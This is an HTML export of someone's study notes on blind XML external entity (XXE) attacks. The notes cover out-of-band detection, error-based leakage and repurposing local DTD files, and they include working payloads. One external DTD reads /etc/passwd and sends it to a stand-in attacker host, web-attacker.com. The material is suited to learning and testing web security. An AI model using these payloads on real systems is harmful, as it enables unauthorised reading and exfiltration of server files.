<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Blind XXE</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Blind XXE</h1><br/>• No returning of values in responses<br />• Could use out-of-band techniques<br />• Trigger XML parsing errors<br /><strong><br />OAST</strong><br />• &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://f2g9j7hhkax.web-attacker.com&quot;&gt; ]&gt;<br />• You can use Burp Collaborater to come up with your custom domain then poll the collaborater interactions to see what is being sent to the domain.<br />• If blocked =&gt; can user parameter entities instead<br />   ◇ Parameters can only be accessed elsewhere within the DTD<br />   ◇ &lt;!ENTITY % myparameterentity &quot;my parameter entity value&quot; &gt;<br />   ◇ &lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM &quot;http://f2g9j7hhkax.web-attacker.com&quot;&gt; %xxe; ]&gt;<br /><strong><br />Exfiltrating Data Out of Band</strong><br />• To actually get information, attacker needs to host malicious DTD on system they control and invoke in an in-band payload<br />• Create an external DTD that can be referenced in an in-band payload<br />			&lt;!ENTITY % filePlease SYSTEM &quot;file:///etc/passwd&quot;&gt;<br />            &lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http://web-attacker.com/?x=%filePlease;&#39;&gt;&quot;&gt;<br />            %eval;<br />            %exfiltrate;<br />• Also try etc/hostname?<br />• Then reference the page that contains that XML in the payload<br /><strong><br />Retrieving Data through error messages</strong><br />• Trigger a parsing error with an error message containing sensitive info<br />			&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;<br />            &lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:///nonexistent/%file;&#39;&gt;&quot;&gt;<br />            %eval;<br />            %error;<br />            <strong><br />Repurposing local DTD</strong><br />• Nested parameter entities are permitted in external DTD&#39;s but not internal.<br />• Loophole in language specs: if DTD hybrid of internal and external declarations, the internal redefines entities in the externa<br />   ◇ This relaxes the no-nesting rule<br />   ◇ Means you can employ error based XXE attack<br />• If out-of-band blocked -&gt; external cannot be loaded from remote, needs to be local to application server<br />• File than happens to exist on local file system<br />• Look for DTD files and custom entity names to overwrite.<br />			&lt;!DOCTYPE foo [<br />                &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/local/app/schema.dtd&quot;&gt;<br />                &lt;!ENTITY % custom_entity &#39;<br />                    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;<br />                    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;<br />                    &amp;#x25;eval;<br />                    &amp;#x25;error;<br />                &#39;&gt;<br />                %local_dtd;<br />            ]&gt;       <br />            <strong><br />Locating existing DTD to repurpose</strong><br />• Use payloads of common file structures.<br />• Once you find some dtd&#39;s, look at the entities you could repurpose<br />			&lt;!DOCTYPE foo [<br />                &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;<br />                %local_dtd;<br />            ]&gt;        </div></body></html>